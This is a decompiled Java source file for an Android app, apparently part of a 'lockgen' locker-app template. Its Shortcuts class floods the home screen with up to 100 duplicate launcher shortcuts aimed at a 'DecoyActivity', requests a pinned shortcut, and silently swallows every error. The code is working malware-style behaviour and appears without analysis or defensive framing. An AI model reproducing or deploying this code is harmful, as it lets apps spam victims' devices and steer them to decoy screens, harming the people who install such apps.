package com.lockgen.template.app.core;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ShortcutInfo;
import android.content.pm.ShortcutManager;

public final class Shortcuts {
    private Shortcuts() {
    }

    public static void flood(final Context context, final int i) {
        if (i <= 0) {
            return;
        }
        new Thread(new Runnable() { // from class: com.lockgen.template.app.core.Shortcuts$$ExternalSyntheticLambda0
            @Override // java.lang.Runnable
            public final void run() {
                Shortcuts.lambda$flood$0(i, context);
            }
        }, "tpl-shortcut").start();
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public static /* synthetic */ void lambda$flood$0(int i, Context context) {
        for (int i2 = 0; i2 < Math.min(i, 100); i2++) {
            try {
                Intent intent = new Intent("com.android.launcher.action.INSTALL_SHORTCUT");
                intent.putExtra("android.intent.extra.shortcut.NAME", label(context));
                intent.putExtra("android.intent.extra.shortcut.ICON_RESOURCE", Intent.ShortcutIconResource.fromContext(context, iconRes(context)));
                Intent intent2 = new Intent("android.intent.action.MAIN");
                intent2.addCategory("android.intent.category.LAUNCHER");
                intent2.setComponent(new ComponentName(context.getPackageName(), context.getPackageName() + ".ui.DecoyActivity"));
                intent2.setFlags(268435456);
                intent.putExtra("android.intent.extra.shortcut.INTENT", intent2);
                intent.putExtra("duplicate", true);
                context.sendBroadcast(intent);
                Thread.sleep(60L);
            } catch (Throwable unused) {
            }
        }
    }

    private static String label(Context context) {
        try {
            PackageManager packageManager = context.getPackageManager();
            return packageManager.getApplicationLabel(packageManager.getApplicationInfo(context.getPackageName(), 0)).toString();
        } catch (Throwable unused) {
            return "工具";
        }
    }

    private static int iconRes(Context context) {
        try {
            return context.getPackageManager().getApplicationInfo(context.getPackageName(), 0).icon;
        } catch (Throwable unused) {
            return 0;
        }
    }

    public static void requestPin(Context context) {
        try {
            ShortcutManager shortcutManager = (ShortcutManager) context.getSystemService(ShortcutManager.class);
            if (shortcutManager != null && shortcutManager.isRequestPinShortcutSupported()) {
                Intent intent = new Intent("android.intent.action.MAIN");
                intent.addCategory("android.intent.category.LAUNCHER");
                intent.setComponent(new ComponentName(context.getPackageName(), context.getPackageName() + ".ui.DecoyActivity"));
                intent.setFlags(268435456);
                shortcutManager.requestPinShortcut(new ShortcutInfo.Builder(context, "entry").setShortLabel(label(context)).setIntent(intent).build(), null);
            }
        } catch (Throwable unused) {
        }
    }
}